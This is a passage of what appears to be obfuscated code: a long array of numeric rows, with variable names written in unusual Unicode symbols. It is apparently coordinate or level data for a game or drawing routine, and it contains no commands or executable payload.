			[ⵠΔΔ, ⵠ[348], ⵠⵠⵠΔ, 47, 264, ΔΔⵠ],
			[ΔⲆⵠ, ⵠ[348], ΔⲆᐃⲆ, 47, 258, ᐃⵠΔ],
			[1, ⵠ[348], 3, 53, 251, ᐃΔΔ],
			[1, ⵠ[348], ⵠⵠⵠΔ, 40, 253, 0],
			[1, ⵠ[348], ᐃⵠΔ, 35, 244, ΔⲆⲆ],
			[ᐃᐃⵠ, ⵠ[348], 0, 37, 233, ⲆΔⵠ],
			[ᐃᐃⵠ, ⵠ[348], ᐃᐃⲆⲆ, 44, 226, 0],
			[ΔΔΔ, ⵠ[348], ⵠⵠⵠΔ, 37, 219, ᐃⵠⲆ],
			[ⵠΔⲆ, ⵠ[348], ⲆⲆΔᐃ, 54, 234, ⵠⲆⲆ],
			[1, ⵠ[348], Ⲇᐃⵠ, 66, 234, 0],
			[1, ⵠ[348], 2, 65, 241, ⵠⲆⲆ],
			[ⵠΔⲆ, ⵠ[348], 0, 68, 249, ᐃΔΔ],
			[1, ⵠ[348], ⲆᐃΔᐃ, 78, 257, ⲆΔⵠ],
			[1, ⵠ[348], ΔⵠᐃⲆ, 86, 253, 0],
			[ⵠⲆΔ, ⵠ[348], 2, 83, 245, 0],
			[1, ⵠ[348], ⵠⲆΔ, 82, 238, 0],
			[1, ⵠ[348], 3, 76, 235, 0],
			[1, ⵠ[348], ΔⵠᐃⲆ, 86, 232, 0],
			[1, ⵠ[348], ⵠⲆⲆ, 86, 224, ΔⲆⲆ],
			[ΔΔΔ, ⵠ[348], 2, 76, 226, 0],
			[1, ⵠ[348], ᐃⲆⵠᐃ, 61, 228, ⲆΔⵠ],
			[Ⲇᐃⵠ, ⵠ[348], ΔⵠᐃⲆ, 58, 217, Δⵠᐃ],
			[1, ⵠ[348], 0, 49, 217, 0],
			[1, ⵠ[348], ᐃⲆᐃⵠⵠ, 11, 179, ΔⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[348], 20, ᐃᐃⲆⵠΔΔᐃ, 180, 0],
			[ⵠⲆΔ, ⵠ[348], 22, ⲆⵠⲆᐃΔ, 181, 0],
			[1, ⵠ[348], ΔΔⵠΔⲆ, 30, 184, ⲆΔⵠ],
			[1, ⵠ[348], ΔΔⲆᐃⵠ, 27, 187, ᐃΔΔ],
			[1, ⵠ[348], ΔⲆⲆⲆⵠ, 30, 195, ᐃⵠⲆ],
			[1, ⵠ[348], ⵠΔⵠⵠⵠ, ⲆⵠΔⵠⵠ, 192, ᐃⵠΔ],
			[1, ⵠ[348], 19, 44, 182, ⵠⲆⲆ],
			[1, ⵠ[348], ᐃΔⲆΔⵠ, 49, 182, 0],
			[1, ⵠ[348], ⵠⲆᐃΔᐃ, 54, 182, 0],
			[ᐃⲆᐃ, ⵠ[348], ᐃΔΔⲆΔ, 59, 183, 0],
			[ΔⲆⵠ, ⵠ[348], 19, 56, 186, ᐃΔΔ],
			[ⵠΔᐃ, ⵠ[348], ΔΔⲆᐃⵠ, 46, 188, 0],
			[ⵠΔⲆ, ⵠ[348], ᐃⲆᐃⵠⵠ, 58, 193, ᐃⵠⲆ],
			[ⵠΔⲆ, ⵠ[348], 19, 67, 187, ⲆΔⵠ],
			[ΔⲆⵠ, ⵠ[348], 19, 65, 192, ⵠⲆⲆ],
			[ⵠΔᐃ, ⵠ[348], 19, 71, 180, 0],
			[ⵠΔΔ, ⵠ[348], ᐃⲆᐃⵠⵠ, 78, 187, 0],
			[ΔΔΔ, ⵠ[348], 19, 80, 194, ᐃΔΔ],
			[ⵠΔᐃ, ⵠ[348], 19, 72, 193, Δⵠᐃ],
			[1, ⵠ[348], ΔⲆⲆⲆⵠ, 82, 182, 0],
			[ᐃⲆᐃ, ⵠ[348], ΔΔⵠΔⲆ, 88, 185, 0],
			[1, ⵠ[348], ᐃΔⲆΔⵠ, 87, 189, ⵠⲆⲆ],
			[1, ⵠ[348], ΔΔΔΔⲆ, 86, 197, 0],
			[1, ⵠ[348], ᐃⲆᐃⵠⵠ, 85, 203, 0],
			[ⵠⲆΔ, ⵠ[348], 19, 74, 200, 0],
			[ᐃⲆᐃ, ⵠ[348], ΔΔⵠΔⲆ, 70, 202, 0],
			[1, ⵠ[348], 19, 83, 199, 0],
			[1, ⵠ[348], ⲆⲆⲆⵠᐃ, 86, 208, 0],
			[1, ⵠ[348], ᐃΔⲆΔⵠ, 84, 214, ᐃΔΔ],
			[1, ⵠ[348], 19, 83, 211, 0],
			[1, ⵠ[348], 19, 84, 217, 0],
			[1, ⵠ[348], 19, 77, 210, 0],
			[ᐃᐃⵠ, ⵠ[348], 19, 71, 210, 0],
			[ᐃⲆᐃ, ⵠ[348], 19, 73, 213, ΔⲆⲆ],
			[1, ⵠ[348], 19, 66, 207, Δⵠᐃ],
			[1, ⵠ[348], ΔΔⵠΔⲆ, 66, 204, ᐃⵠⲆ],
			[1, ⵠ[348], ⵠⲆᐃΔᐃ, 62, 209, ᐃΔΔ],
			[1, ⵠ[348], ΔΔΔΔⲆ, 63, 201, ⲆΔⵠ],
			[ΔΔΔ, ⵠ[348], ΔⲆⲆⲆⵠ, 56, 205, ᐃⵠΔ],
			[1, ⵠ[348], ΔⲆⲆⲆⵠ, 49, 199, 0],
			[ⵠΔᐃ, ⵠ[348], 19, 50, 205, 0],
			[ⵠΔⲆ, ⵠ[348], ⲆⲆⲆⵠᐃ, 40, 197, ᐃⵠΔ],
			[1, ⵠ[348], 19, 38, 198, ΔΔⵠ],
			[ⵠⲆΔ, ⵠ[348], 19, 40, 208, 0],
			[1, ⵠ[348], 19, 36, 204, ᐃⵠⲆ],
			[1, ⵠ[348], ⲆⲆⵠΔⵠ, 33, 204, ΔⲆⲆ],
			[1, ⵠ[348], ⵠⲆᐃΔᐃ, 29, 202, 0],
			[ᐃᐃⵠ, ⵠ[348], 19, 27, 200, ᐃⵠΔ],
			[1, ⵠ[348], ΔΔΔΔⲆ, 26, 193, 0],
			[1, ⵠ[348], ⵠⲆᐃΔᐃ, 18, 201, 0],
			[1, ⵠ[348], ᐃΔΔⲆΔ, ⵠᐃΔᐃᐃ, 199, ⵠⲆⲆ],
			[1, ⵠ[348], 19, 12, 196, 0],
			[1, ⵠ[348], 19, ⲆΔⲆΔⲆ, 204, ᐃⵠⲆ],
			[Ⲇᐃⵠ, ⵠ[348], ⲆⲆⵠΔⵠ, ΔⲆⲆᐃᐃ, 201, 0],
			[ⵠΔᐃ, ⵠ[348], 19, 23, 208, 0],
			[1, ⵠ[348], ⵠΔⵠⵠⵠ, 31, 214, ΔΔⵠ],
			[ΔΔΔ, ⵠ[348], 19, 26, 215, 0],
			[ⵠΔᐃ, ⵠ[348], 19, 36, 217, 0],
			[1, ⵠ[348], ᐃΔΔⲆΔ, 32, 223, 0],
			[1, ⵠ[348], ᐃⲆᐃⵠⵠ, 26, 223, ᐃΔΔ],
			[1, ⵠ[348], ⲆⲆⵠΔⵠ, 18, 218, 0],
			[1, ⵠ[348], ΔΔΔΔⲆ, ΔⵠΔᐃⵠ, 215, 0],
			[1, ⵠ[348], ⲆⲆⲆⵠᐃ, 17, 212, 0],
			[1, ⵠ[348], 19, 15, 224, 0],
			[ᐃᐃⵠ, ⵠ[348], 19, 19, 229, ΔⲆⲆ],
			[1, ⵠ[348], 19, ⲆΔΔᐃᐃ, 230, ⵠⲆⲆ],
			[1, ⵠ[348], 19, 22, 240, Δⵠᐃ],
			[1, ⵠ[348], ΔⲆⲆⲆⵠ, 13, 238, ᐃⵠⲆ],
			[1, ⵠ[348], ᐃΔⲆΔⵠ, ⲆⲆⲆΔⲆΔᐃ, 243, 0],
			[ⵠΔᐃ, ⵠ[348], ⵠⲆᐃΔᐃ, 24, 244, Δⵠᐃ],
			[1, ⵠ[348], 19, 24, 250, 0],
			[ⵠΔᐃ, ⵠ[348], 19, 28, 253, 0],
			[1, ⵠ[348], 19, 33, ⵠᐃᐃⵠⲆⵠⲆ, 0],
			[1, ⵠ[348], ᐃΔΔⲆΔ, 34, 260, 0],
			[ⵠΔⲆ, ⵠ[348], ⲆⲆⲆⵠᐃ, 31, 260, ᐃΔΔ],
			[1, ⵠ[348], 19, 38, 267, 0],
			[1, ⵠ[348], 19, 44, 264, ⲆΔⵠ],
			[ᐃⲆᐃ, ⵠ[348], ΔΔⲆᐃⵠ, 43, 261, ⲆΔⵠ],
			[1, ⵠ[348], 19, ᐃⲆᐃᐃΔ, 257, 0],
			[ᐃᐃⵠ, ⵠ[348], ᐃⲆᐃⵠⵠ, 22, 258, 0],
			[1, ⵠ[348], 19, 12, 253, ⲆΔⵠ],
			[1, ⵠ[348], 19, ΔᐃΔⲆⲆ, 242, 0],
			[1, ⵠ[348], 19, ΔᐃΔⲆⲆ, 255, ᐃΔΔ],
			[1, ⵠ[348], ΔΔⵠΔⲆ, ΔⲆⵠΔⲆⲆⵠ, 264, 0],
			[ⵠΔΔ, ⵠ[348], 19, 20, 265, ᐃⵠⲆ],
			[ΔΔΔ, ⵠ[348], 19, ⵠⲆⲆⲆᐃ, 271, ᐃⵠⲆ],
			[ᐃᐃⵠ, ⵠ[348], 19, ⲆⲆᐃⵠΔ, 272, 0],
			[ᐃᐃⵠ, ⵠ[348], ᐃⲆᐃⵠⵠ, 13, 277, Δⵠᐃ],
			[1, ⵠ[348], 19, 21, 277, 0],
			[ᐃᐃⵠ, ⵠ[348], 19, 21, 281, ⵠⲆⲆ],
			[ᐃᐃⵠ, ⵠ[348], ΔΔⵠΔⲆ, 27, 282, 0],
			[ΔΔΔ, ⵠ[348], 19, 29, 278, ᐃⵠΔ],
			[1, ⵠ[348], 19, 29, 273, ΔⲆⲆ],
			[ⵠΔᐃ, ⵠ[348], ⵠⲆᐃΔᐃ, 36, 271, 0],
			[1, ⵠ[348], ΔΔΔΔⲆ, 8, 278, Δⵠᐃ],
			[1, ⵠ[348], 19, 11, 286, ΔⲆⲆ],
			[ⵠΔᐃ, ⵠ[348], ΔⲆⲆⲆⵠ, 17, 291, Δⵠᐃ],
			[ᐃⲆᐃ, ⵠ[348], 19, ΔⵠⵠⲆⵠ, 294, ΔΔⵠ],
			[ⵠⲆΔ, ⵠ[348], ᐃΔⲆΔⵠ, 8, 292, ⵠⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[348], ᐃΔⲆΔⵠ, 12, 300, 0],
			[1, ⵠ[348], ⵠⲆᐃΔᐃ, ⲆⵠⲆᐃΔ, 298, 0],
			[1, ⵠ[348], ᐃⲆᐃⵠⵠ, 16, 301, 0],
			[ⵠⲆΔ, ⵠ[348], ⲆⲆⵠΔⵠ, 27, 296, 0],
			[ΔΔΔ, ⵠ[348], ⲆⲆⵠΔⵠ, 25, 292, ᐃⵠΔ],
			[ⵠΔΔ, ⵠ[348], 19, 23, 301, ᐃⵠⲆ],
			[1, ⵠ[348], 19, 28, 301, 0],
			[ⵠⲆΔ, ⵠ[348], 19, 35, 297, 0],
			[Ⲇᐃⵠ, ⵠ[348], 19, 37, 301, ᐃⵠⲆ],
			[1, ⵠ[348], 19, 43, 301, ᐃⵠΔ],
			[1, ⵠ[348], ᐃΔⲆΔⵠ, 46, 294, 0],
			[1, ⵠ[348], 19, 46, 288, ⲆΔⵠ],
			[ⵠΔΔ, ⵠ[348], 19, 40, 287, ᐃⵠΔ],
			[ⵠⲆΔ, ⵠ[348], ΔΔⲆᐃⵠ, 50, 301, ΔΔⵠ],
			[ᐃᐃⵠ, ⵠ[348], ΔΔⲆᐃⵠ, 58, 301, 0],
			[ΔⲆⵠ, ⵠ[348], 19, 64, 301, 0],
			[ⵠⲆΔ, ⵠ[348], ⵠⲆᐃΔᐃ, 71, 301, ⵠⲆⲆ],
			[ᐃⲆᐃ, ⵠ[348], ⵠΔⵠⵠⵠ, 80, 301, 0],
			[1, ⵠ[348], 19, 87, 301, 0],
			[Ⲇᐃⵠ, ⵠ[348], ⵠΔⵠⵠⵠ, 86, 294, ᐃⵠⲆ],
			[1, ⵠ[348], ᐃΔⲆΔⵠ, 87, 290, ⵠⲆⲆ],
			[1, ⵠ[348], ΔΔΔΔⲆ, 82, 286, ᐃΔΔ],
			[1, ⵠ[348], ⵠⲆᐃΔᐃ, 75, 285, Δⵠᐃ],
			[ΔⲆⵠ, ⵠ[348], 19, 66, 292, 0],
			[1, ⵠ[348], 19, 66, 288, ᐃⵠΔ],
			[ⵠΔᐃ, ⵠ[348], ΔⲆⲆⲆⵠ, 58, 288, 0],
			[1, ⵠ[348], ΔΔⵠΔⲆ, 67, 282, 0],
			[1, ⵠ[348], 19, 61, 281, 0],
			[1, ⵠ[348], ᐃΔΔⲆΔ, 60, 295, ᐃΔΔ],
			[ΔΔΔ, ⵠ[348], 19, 50, 282, ᐃⵠⲆ],
			[1, ⵠ[348], ⲆⲆⲆⵠᐃ, 47, 283, 0],
			[Ⲇᐃⵠ, ⵠ[348], ᐃⲆᐃⵠⵠ, 48, 281, 0],
			[Ⲇᐃⵠ, ⵠ[348], ᐃΔⲆΔⵠ, 44, 277, 0],
			[ᐃⲆᐃ, ⵠ[348], ΔΔⵠΔⲆ, 41, 282, 0],
			[Ⲇᐃⵠ, ⵠ[348], ΔⲆⲆⲆⵠ, 38, 281, 0],
			[ⵠΔΔ, ⵠ[348], ⲆⲆⲆⵠᐃ, 42, 288, 0],
			[ΔⲆⵠ, ⵠ[348], 19, 52, 281, 0],
			[1, ⵠ[348], 19, 50, 275, 0],
			[1, ⵠ[348], 19, 39, 277, 0],
			[1, ⵠ[348], ΔΔⵠΔⲆ, 38, 284, ᐃΔΔ],
			[1, ⵠ[348], ᐃΔⲆΔⵠ, 51, 285, ΔΔⵠ],
			[ΔⲆⵠ, ⵠ[348], ᐃⲆᐃⵠⵠ, 38, 278, 0],
			[ⵠΔᐃ, ⵠ[348], 19, 47, 272, ᐃΔΔ],
			[ⵠΔΔ, ⵠ[348], ΔⲆⲆⲆⵠ, 44, 267, ΔΔⵠ],
			[ⵠΔΔ, ⵠ[348], ⵠΔⵠⵠⵠ, 76, 280, ᐃⵠⲆ],
			[ᐃⲆᐃ, ⵠ[348], 19, 78, 272, 0],
			[1, ⵠ[348], 19, 68, 275, ⲆΔⵠ],
			[ⵠΔⲆ, ⵠ[348], ⵠΔⵠⵠⵠ, 70, 265, ΔⲆⲆ],
			[ⵠⲆΔ, ⵠ[348], ⲆⲆⵠΔⵠ, 65, 263, ᐃΔΔ],
			[1, ⵠ[348], 19, 64, 262, ΔΔⵠ],
			[ᐃⲆᐃ, ⵠ[348], ᐃΔΔⲆΔ, 60, 268, 0],
			[1, ⵠ[348], ΔΔⲆᐃⵠ, 56, 266, ᐃⵠⲆ],
			[1, ⵠ[348], ᐃΔΔⲆΔ, 55, 260, 0],
			[1, ⵠ[348], ΔΔⵠΔⲆ, 59, 258, ⵠⲆⲆ],
			[1, ⵠ[348], ΔⲆⲆⲆⵠ, 62, ᐃᐃᐃⵠⵠ, ΔⲆⲆ],
			[ⵠⲆΔ, ⵠ[348], ΔΔⵠΔⲆ, 67, 253, ⲆΔⵠ],
			[1, ⵠ[348], 19, 69, ⵠⲆⵠⵠⵠⵠᐃ, 0],
			[1, ⵠ[348], ΔΔΔΔⲆ, 44, 253, ΔΔⵠ],
			[1, ⵠ[348], 19, 44, 250, ΔΔⵠ],
			[1, ⵠ[348], ⵠⲆᐃΔᐃ, 36, 245, ⲆΔⵠ],
			[ΔΔΔ, ⵠ[348], 19, 39, 239, 0],
			[ⵠΔⲆ, ⵠ[348], ΔΔⵠΔⲆ, 42, 234, 0],
			[1, ⵠ[348], 19, 37, 235, ΔΔⵠ],
			[ΔⲆⵠ, ⵠ[348], 19, 45, 226, ⲆΔⵠ],
			[ΔΔΔ, ⵠ[348], 19, 46, 222, 0],
			[ᐃᐃⵠ, ⵠ[348], 19, 51, 218, ⵠⲆⲆ],
			[ᐃⲆᐃ, ⵠ[348], ᐃΔΔⲆΔ, 68, 218, ᐃⵠΔ],
			[ⵠⲆΔ, ⵠ[348], 19, 74, 224, ᐃⵠΔ],
			[ⵠΔⲆ, ⵠ[348], ⲆⲆⵠΔⵠ, 76, 218, ⲆΔⵠ],
			[ᐃⲆᐃ, ⵠ[348], ΔΔⵠΔⲆ, 84, 221, ΔⲆⲆ],
			[ⵠΔᐃ, ⵠ[348], 19, 88, 223, 0],
			[ΔⲆⵠ, ⵠ[348], 19, 76, 230, ⲆΔⵠ],
			[ΔⲆⵠ, ⵠ[348], 19, 86, 234, ᐃⵠⲆ],
			[1, ⵠ[348], ΔΔⲆᐃⵠ, 79, 237, 0],
			[1, ⵠ[348], ⲆⲆⵠΔⵠ, 75, 243, ΔΔⵠ],
			[1, ⵠ[348], ⵠΔⵠⵠⵠ, 81, 245, ⵠⲆⲆ],
			[ⵠⲆΔ, ⵠ[348], ᐃΔⲆΔⵠ, 83, 247, 0],
			[1, ⵠ[348], ⲆⲆⵠΔⵠ, 88, 247, 0],
			[1, ⵠ[348], ᐃΔⲆΔⵠ, 84, 254, ⲆΔⵠ],
			[ΔΔΔ, ⵠ[348], ΔΔⲆᐃⵠ, 86, 251, 0],
			[1, ⵠ[348], ᐃⲆᐃⵠⵠ, 85, 260, ⵠⲆⲆ],
			[1, ⵠ[348], ᐃⲆᐃⵠⵠ, 79, 260, 0],
			[ⵠΔᐃ, ⵠ[348], 19, 76, 251, ΔΔⵠ],
			[ⵠΔΔ, ⵠ[348], ΔΔΔΔⲆ, 72, 251, ⲆΔⵠ],
			[ⵠΔΔ, ⵠ[348], 19, 69, 251, 0],
			[1, ⵠ[348], ⵠΔⵠⵠⵠ, 87, 266, ᐃΔΔ],
			[Ⲇᐃⵠ, ⵠ[348], ᐃⲆᐃⵠⵠ, 89, 270, 0],
			[1, ⵠ[348], ⲆⲆⵠΔⵠ, 87, 271, 0],
			[1, ⵠ[348], ⲆⲆⵠΔⵠ, 82, 277, ΔⲆⲆ],
			[ΔⲆⵠ, ⵠ[348], 19, 87, 284, 0],
			[ΔⲆⵠ, ⵠ[348], ⵠΔⵠⵠⵠ, 87, 237, 0],
			[1, ⵠ[348], 19, 88, 179, ΔⲆⲆ],
			[1, ⵠ[348], 19, 50, 191, 0],
			[1, ⵠ[348], 19, 52, 221, ᐃⵠΔ],
			[ⵠΔΔ, ⵠ[348], 19, 34, 234, 0],
			[ⵠΔΔ, ⵠ[348], ᐃΔΔⲆΔ, 27, 233, 0],
			[ⵠΔΔ, ⵠ[348], ΔΔⲆᐃⵠ, 37, 293, ᐃⵠⲆ],
			[1, ⵠ[348], 29, ⵠΔΔⵠⲆ, 181, 0],
			[1, ⵠ[348], 29, ᐃⵠⲆᐃᐃ, 180, 0],
			[1, ⵠ[348], 30, 13, 186, 0],
			[ΔΔΔ, ⵠ[348], 31, 24, 183, ᐃⵠΔ],
			[1, ⵠ[348], 32, 33, 185, 0],
			[ᐃⲆᐃ, ⵠ[348], 32, 37, 182, 0],
			[ΔΔΔ, ⵠ[348], 29, 45, 183, ᐃⵠⲆ],
			[1, ⵠ[348], 30, 48, 183, 0],
			[1, ⵠ[348], 30, 58, 181, Δⵠᐃ],
			[1, ⵠ[348], 30, 66, 188, Δⵠᐃ],
			[ⵠΔⲆ, ⵠ[348], 30, 66, 182, ᐃⵠⲆ],
			[ⵠΔⲆ, ⵠ[348], 29, 63, 196, 0],
			[1, ⵠ[348], 29, 54, 194, 0],
			[ΔⲆⵠ, ⵠ[348], 30, 79, 189, ᐃⵠΔ],
			[ΔⲆⵠ, ⵠ[348], 30, 87, 182, 0],
			[1, ⵠ[348], 30, 83, 185, 0],
			[1, ⵠ[348], 29, 88, 189, 0],
			[ⵠΔΔ, ⵠ[348], 29, 85, 202, 0],
			[1, ⵠ[348], 31, 82, 203, 0],
			[Ⲇᐃⵠ, ⵠ[348], 32, 80, 201, Δⵠᐃ],
			[1, ⵠ[348], 32, 87, 209, ΔⲆⲆ],
			[1, ⵠ[348], 32, 83, 214, 0],
			[ᐃᐃⵠ, ⵠ[348], 30, 88, 220, ΔⲆⲆ],
			[ΔΔΔ, ⵠ[348], 30, 78, 229, 0],
			[ⵠΔⲆ, ⵠ[348], 30, 73, 223, 0],
			[1, ⵠ[348], 29, 74, 217, Δⵠᐃ],
			[1, ⵠ[348], 29, 67, 217, ⲆΔⵠ],
			[ᐃᐃⵠ, ⵠ[348], 30, 72, 208, ΔⲆⲆ],
			[ⵠΔⲆ, ⵠ[348], 30, 73, 199, 0],
			[ⵠΔⲆ, ⵠ[348], 30, 65, 207, 0],
			[ⵠⲆΔ, ⵠ[348], 29, 63, 210, 0],
			[1, ⵠ[348], 29, 50, 204, 0],
			[ᐃⲆᐃ, ⵠ[348], 30, 41, 205, 0],
			[1, ⵠ[348], 29, 35, 205, ᐃΔΔ],
			[1, ⵠ[348], 30, 27, 202, 0],
			[1, ⵠ[348], 30, ⵠⵠⵠⲆᐃ, 201, ⵠⲆⲆ],
			[ⵠΔᐃ, ⵠ[348], 29, 10, 203, ⲆΔⵠ],
			[1, ⵠ[348], 29, ⵠᐃⵠΔᐃ, 196, ⵠⲆⲆ],
			[1, ⵠ[348], 29, 24, 187, ΔⲆⲆ],
			[ⵠΔΔ, ⵠ[348], 29, 28, 223, ΔⲆⲆ],
			[1, ⵠ[348], 29, 32, 212, ΔΔⵠ],
			[1, ⵠ[348], 30, 28, 214, 0],
			[1, ⵠ[348], 31, 24, 218, ΔⲆⲆ],
			[1, ⵠ[348], 29, 36, 219, 0],
			[1, ⵠ[348], 29, 37, 217, 0],
			[1, ⵠ[348], 29, 52, 217, 0],
			[1, ⵠ[348], 29, 59, 217, ΔⲆⲆ],
			[1, ⵠ[348], 29, 69, 231, ᐃⵠΔ],
			[1, ⵠ[348], 29, 64, 242, ⵠⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[348], 30, 53, 253, 0],
			[ⵠⲆΔ, ⵠ[348], 30, 45, 250, ⵠⲆⲆ],
			[1, ⵠ[348], 30, 58, 261, ⵠⲆⲆ],
			[1, ⵠ[348], 30, 73, 276, 0],
			[1, ⵠ[348], 30, 64, 276, 0],
			[ⵠΔᐃ, ⵠ[348], 30, 82, 285, ΔⲆⲆ],
			[1, ⵠ[348], 30, 65, 293, 0],
			[1, ⵠ[348], 30, 56, 288, 0],
			[1, ⵠ[348], 30, 45, 296, 0],
			[ΔΔΔ, ⵠ[348], 30, 40, 288, 0],
			[ΔⲆⵠ, ⵠ[348], 30, 37, 283, 0],
			[ΔⲆⵠ, ⵠ[348], 30, 53, 280, ⵠⲆⲆ],
			[1, ⵠ[348], 30, 41, 277, 0],
			[ⵠΔΔ, ⵠ[348], 29, 28, 296, ᐃⵠΔ],
			[1, ⵠ[348], 29, ⲆⵠΔⵠⵠ, 292, ΔΔⵠ],
			[ⵠΔⲆ, ⵠ[348], 29, 24, 284, ᐃΔΔ],
			[1, ⵠ[348], 30, 10, 295, 0],
			[ᐃⲆᐃ, ⵠ[348], 30, ⲆΔΔᐃᐃ, 286, ΔⲆⲆ],
			[1, ⵠ[348], 30, 15, 279, Δⵠᐃ],
			[1, ⵠ[348], 30, 15, 269, ⲆΔⵠ],
			[ᐃⲆᐃ, ⵠ[348], 30, 21, 259, 0],
			[1, ⵠ[348], 30, ⵠΔᐃΔᐃ, 256, ΔΔⵠ],
			[ᐃᐃⵠ, ⵠ[348], 30, 31, 245, ⲆΔⵠ],
			[1, ⵠ[348], 30, 12, 240, ᐃΔΔ],
			[ⵠΔΔ, ⵠ[348], 30, 28, 235, 0],
			[1, ⵠ[348], 30, 13, 226, ⲆΔⵠ],
			[1, ⵠ[348], 30, 39, 231, ⵠⲆⲆ],
			[Ⲇᐃⵠ, ⵠ[348], 30, 61, 226, 0],
			[ΔΔΔ, "r", 96, 262, 0],
			[ΔΔΔ, "r", 97, 262, 0],
			[ΔⲆⵠ, "r", 98, 262, 0],
			[1, "r", 97, 270, ⲆΔⵠ],
			[1, "r", 97, 271, 0],
			[1, "r", 97, 272, 0],
			[ⵠΔΔ, "r", 97, 273, 0],
			[1, "r", 97, 274, ᐃΔΔ],
			[1, "r", 97, 275, 0],
			[1, "r", 97, 276, 0],
			[1, "r", 97, 277, ᐃⵠⲆ],
			[ᐃⲆᐃ, "r", 97, 278, Δⵠᐃ],
			[1, "r", 98, 270, ⵠⲆⲆ],
			[Ⲇᐃⵠ, "r", 98, 271, ᐃⵠΔ],
			[1, "r", 98, 272, 0],
			[1, "r", 98, 273, 0],
			[ⵠⲆΔ, "r", 98, 274, ᐃⵠⲆ],
			[ΔⲆⵠ, "r", 98, 275, ⵠⲆⲆ],
			[1, "r", 98, 276, ᐃⵠΔ],
			[ᐃᐃⵠ, "r", 98, 277, 0],
			[ΔⲆⵠ, "r", 98, 278, 0],
			[1, "r", 96, 283, ᐃΔΔ],
			[1, "r", 97, 283, ⵠⲆⲆ],
			[1, "r", 97, 284, 0],
			[1, "r", 97, 285, 0],
			[1, "r", 98, 283, 0],
			[1, "r", 98, 284, ᐃⵠⲆ],
			[1, "r", 98, 285, ΔΔⵠ],
			[ᐃⲆᐃ, "r", 96, 270, ᐃΔΔ],
			[1, "r", 96, 271, ᐃⵠΔ],
			[ⵠΔᐃ, "r", 96, 272, ᐃⵠⲆ],
			[ᐃⲆᐃ, "r", 96, 273, ᐃⵠⲆ],
			[1, "r", 96, 274, ⲆΔⵠ],
			[ⵠΔⲆ, "r", 96, 275, ᐃΔΔ],
			[ΔΔΔ, "r", 96, 276, 0],
			[1, "r", 96, 277, ΔⲆⲆ],
			[1, "r", 96, 278, 0],
			[ΔⲆⵠ, "r", 44, 248, 0],
			[1, ⵠ[348], ⵠΔⵠΔΔ, 94, 290, 0],
			[1, ⵠ[348], ΔᐃᐃΔⵠ, 94, 252, ᐃΔΔ],
			[1, ⵠ[348], 16, 94, 228, ᐃΔΔ],
			[ΔⲆⵠ, ⵠ[348], ⵠⵠᐃΔΔ, 94, 200, 0],
			[1, "r", 95, 282, 1],
			[1, "r", 95, 281, 1],
			[ⵠⲆΔ, "r", 94, 281, ⵠΔᐃ],
			[1, "r", 90, 281, ⵠⲆΔ],
			[ⵠΔΔ, "r", 91, 282, 1],
			[1, "r", 89, 281, ΔⲆⵠ],
			[ⵠΔⲆ, "r", 85, 276, 1],
			[ⵠΔⲆ, "r", 85, 277, ⵠⲆΔ],
			[ⵠΔᐃ, "r", 86, 278, 1],
			[1, "p", 0, 85, 279, ⵠΔᐃ],
			[1, "r", 86, 279, ⵠΔᐃ],
			[1, "r", 87, 280, ΔΔΔ],
			[ⵠΔᐃ, "r", 96, 281, ᐃΔΔ],
			[1, "r", 97, 281, 0],
			[1, "r", 98, 281, Δⵠᐃ],
			[ᐃⲆᐃ, "r", 98, 282, 0],
			[1, "r", 97, 282, 0],
			[1, "r", 96, 282, Δⵠᐃ],
			[ⵠⲆΔ, "r", 68, 261, 1],
			[ᐃⲆᐃ, ⵠ[273], 1, 94, 168, 0],
			[1, ⵠ[273], 2, 94, 151, ⲆΔⵠ],
			[ⵠΔᐃ, ⵠ[273], 1, 94, 138, ᐃΔΔ],
			[ᐃᐃⵠ, ⵠ[273], ΔΔΔ, 93, 124, 0],
			[ⵠⲆΔ, ⵠ[273], Ⲇᐃⵠ, 94, 129, 0],
			[ⵠΔⲆ, ⵠ[273], 1, 93, 113, 0],
			[ΔΔΔ, ⵠ[273], ΔⲆⵠ, 94, 102, 0],
			[1, ⵠ[273], ΔⲆⵠ, 94, 93, Δⵠᐃ],
			[1, ⵠ[273], 1, 93, 90, ⲆΔⵠ],
			[1, ⵠ[273], 1, 94, 79, 0],
			[Ⲇᐃⵠ, ⵠ[273], ⵠⲆΔ, 94, 76, ᐃⵠΔ],
			[Ⲇᐃⵠ, ⵠ[273], 1, 93, 70, 0],
			[1, ⵠ[273], Ⲇᐃⵠ, 93, 63, 0],
			[Ⲇᐃⵠ, ⵠ[273], ⵠΔΔ, 94, 53, ΔⲆⲆ],
			[1, ⵠ[273], 1, 93, 10, 0],
			[ΔΔΔ, ⵠ[273], 1, 85, 8, ᐃⵠⲆ],
			[ⵠΔⲆ, ⵠ[273], Ⲇᐃⵠ, 94, 12, 0],
			[ⵠΔΔ, ⵠ[273], 1, 66, ⵠᐃᐃΔⲆ, 0],
			[ΔⲆⵠ, ⵠ[273], ⵠΔΔ, 69, ΔΔⵠⲆⵠ, ΔⲆⲆ],
			[1, ⵠ[273], ⲆⲆΔᐃ, 68, ΔⲆᐃᐃᐃ, ᐃΔΔ],
			[Ⲇᐃⵠ, ⵠ[273], ᐃⲆⵠᐃ, 66, 25, 0],
			[1, ⵠ[273], ᐃⲆⵠᐃ, 92, 9, ᐃⵠΔ],
			[ⵠΔΔ, ⵠ[273], 2, 94, 14, 0],
			[1, ⵠ[273], ⲆⲆΔᐃ, 87, ⵠⲆΔⵠⵠ, 0],
			[Ⲇᐃⵠ, ⵠ[273], 2, 71, ΔⵠᐃᐃⲆ, 0],
			[1, ⵠ[273], ᐃⲆⵠᐃ, 90, ⵠΔᐃΔᐃ, 0],
			[1, ⵠ[273], 2, 91, ⲆⲆⲆΔⲆΔᐃ, 0],
			[ᐃⲆᐃ, ⵠ[273], ΔⲆⵠ, 74, 12, 0],
			[1, ⵠ[273], ⲆⲆΔᐃ, 72, ⵠΔᐃΔᐃ, ᐃΔΔ],
			[1, ⵠ[273], 2, 75, 13, 0],
			[1, ⵠ[273], ⵠⵠⵠΔ, 74, 15, ⲆΔⵠ],
			[1, ⵠ[273], ᐃⲆΔⲆ, 84, ΔΔΔᐃᐃⲆᐃ, 0],
			[1, ⵠ[273], ⲆⲆΔᐃ, 81, ΔᐃΔⲆⲆⲆⲆ, ⲆΔⵠ],
			[ΔⲆⵠ, ⵠ[273], 1, 84, 13, 0],
